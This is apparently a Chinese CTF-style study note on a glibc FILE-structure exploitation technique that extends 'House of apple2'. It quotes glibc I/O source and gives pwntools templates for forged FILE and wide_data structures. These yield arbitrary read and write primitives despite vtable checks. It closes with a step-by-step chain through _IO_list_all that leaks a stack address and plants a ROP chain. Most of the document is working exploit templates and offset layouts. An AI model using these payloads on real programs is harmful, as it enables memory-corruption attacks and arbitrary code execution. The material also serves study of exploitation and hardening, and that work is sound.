## 前置知识

[[House of apple2 学习笔记]]，[[House of apple3 学习笔记]]

house of apple2 是建立在 `fp->_wide_data->_wide_vtable` 没有指针检查保护上的，假如加上了检查，只能选择虚表内的函数进行执行，我们能够选什么呢？

## 任意读写原语


### 任意写原语1

```c
int
_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (stdout);

      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (stdout, EOF);

      _IO_release_lock (stdout);
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);  // [1]
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)


int
_IO_switch_to_get_mode (FILE *fp)
{
  if (fp->_IO_write_ptr > fp->_IO_write_base)  // [2]
    if (_IO_OVERFLOW (fp, EOF) == EOF)
      return EOF;
  if (_IO_in_backup (fp))
    fp->_IO_read_base = fp->_IO_backup_base;
  else
    {
      fp->_IO_read_base = fp->_IO_buf_base;
      if (fp->_IO_write_ptr > fp->_IO_read_end)
	fp->_IO_read_end = fp->_IO_write_ptr;
    }
  fp->_IO_read_ptr = fp->_IO_write_ptr;

  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_read_ptr;

  fp->_flags &= ~_IO_CURRENTLY_PUTTING;
  return 0;
}

```

注意这里 [1] 调用了 `read`，可以看到 `read` 的三个参数都是可控的，也就相当于可以构造一个任意写原语。

在构造时，[2] 的条件和和 `_IO_flush_all` 调用 `_IO_OVERFLOW` 冲突了：

```c
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)  // 因此不能走上面这个判断
	   || (_IO_vtable_offset (fp) == 0  // 得走下面这个
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
```


那么实现任意地址写的 fake file 设置如下

1. `_flags` 设置为 `~(2 | 0x8 | 0x800)`，设置为 0 即可（与 apple2 相同）
2. `vtable` 设置为 `_IO_wfile_jumps` / `_IO_wfile_jumps_mmap` 地址，使得调用 `_IO_wfile_overflow` 即可（注意此处与 apple2 同的是，此处的 vtable 不能加偏移，否则会打乱 `_IO_SYSREAD` 的调用）
3. `_wide_data->_IO_write_base` 设置为 0，即满足 `*(_wide_data + 0x18) = 0`（与 apple2 相同）
4. `_wide_data->_IO_write_ptr` 设置为大于 `_wide_data->_IO_write_base`，即满足 `*(_wide_data + 0x20) > *(_wide_data + 0x18)`（注意此处不同）
5. `_wide_data->_IO_buf_base` 设置为 0，即满足 `*(_wide_data + 0x30) = 0`（与apple2相同）
6. `_wide_data->_wide_vtable` 设置为任意一个包含 `_IO_new_file_underflow`，其中原生的 vtable 就有，设置成 `_IO_file_jumps-0x48` 即可
7. `_vtable_offset` 设置为 `0`
8. `_IO_buf_base` 与 `_IO_buf_end` 设置为你需要写入的地址范围
9. `_chain` 设置为你下一个触发的 `fake file` 地址
10. `_IO_write_ptr <= _IO_write_base` 即可
11. `_fileno` 设置为 0，表示 `read(0, buf, size)`
12. `_mode` 设置为 2，满足 `fp->_mode > 0` 即可


```python
fake_file_read = flat({
    0x00: 0, # _flags
    0x20: 0, # _IO_write_base
    0x28: 0, # _IO_write_ptr
    
    0x38: 任意地址写的起始地址, # _IO_buf_base
    0x40: 任意地址写的终止地址, # _IO_buf_end
	
    0x70: 0, # _fileno
    0x82: b"\x00", # _vtable_offset
    0xc0: 2, # _mode
    0xa0: wide_data的地址, # _wide_data
    0x68: 下一个调用的fake file地址, # _chain
    0xd8: _IO_wfile_jumps, # vtable
}, filler=b"\x00")

fake_wide_data = flat({
    0xe0: _IO_file_jumps - 0x48,
    0x18: 0,
    0x20: 1,
    0x30: 0,
}, filler=b"\x00")
```


### 任意写原语2

通过将 `_vtables` 减去 0x8，就能调用 `_IO_new_file_finish`

```c
void __fastcall IO_new_file_finish(FILE_0 *fp, int dummy)
{
  __int64 v2; // rbp

  if ( fp->_fileno != -1 )
  {
    if ( fp->_mode <= 0 )
      IO_new_do_write(fp, fp->_IO_write_base, fp->_IO_write_ptr - fp->_IO_write_base);
    else
      _GI__IO_wdo_write(
        fp,
        fp->_wide_data->_IO_write_base,
        fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base);
    if ( (fp->_flags & 0x40) == 0 )
    {
      v2 = *(_QWORD *)&fp[1]._flags;
      if ( (unsigned __int64)(v2 - (_QWORD)_io_vtables) > 0x92F )
        IO_vtable_check();
      (*(void (__fastcall **)(FILE_0 *))(v2 + 0x88))(fp);
    }
  }
  _GI__IO_default_finish(fp, 0);
}
```

恰巧里面刚好也有 `_IO_new_do_write`，由于它是通过 `_vtables + 0x78` 调用函数，所以实际调用 `_IO_file_read`

```c
ssize_t __fastcall _GI__IO_file_read(FILE_0 *fp, void *buf, ssize_t size)
{
  if ( (fp->_flags2 & 2) != 0 )
    return _GI___read_nocancel(fp->_fileno, buf, size);
  else
    return _GI___libc_read(fp->_fileno, buf, size);
}
```

板子如下：

```python
fake_io_read = fit({
    0x00: 0x8000 | 0x40 | 0x1000, #_flags
    0x20: read_addr, #_IO_write_base
    0x28: read_addr + len, #_IO_write_ptr
    0x68: next_FILE, #_chain
    0x70: 0, # _fileno
    0xc0: 0, #_modes
    0xd8: _IO_file_jumps - 0x8, #_vtables
}, filler=b'\x00')
```


### 任意读原语


```python
fake_io_write = fit({
    0x00: 0x8000 | 0x800 | 0x1000, #_flags
    0x20: write_addr, #_IO_write_base
    0x28: write_addr + len, #_IO_write_ptr
    0x68: next_FILE, #_chain
    0x70: 1, # _fileno
    0xc0: 0, #_modes
    0xd8: _IO_file_jumps, #_vtables
}, filler=b'\x00')
```

## 劫持控制流

有了任意读写原语自然是直接打栈了：

1. 通过程序给的（只需要一次 8 字节）任意地址写堆地址原语，修改 `_IO_list_all` 指向 `fake_file1`，`fake_file1` 是布置在堆上的一个任意地址写原语
2. 通过任意地址写原语继续写两个 `fake_file2` 和 `fake_file3`，前者任意地址读原语泄漏栈地址，后者继续任意地址写用来布置第四个 `fake_file`
3. 构造任意地址写原语 `fake_file4`，往泄漏的栈地址上读入 rop_chain 完成攻击。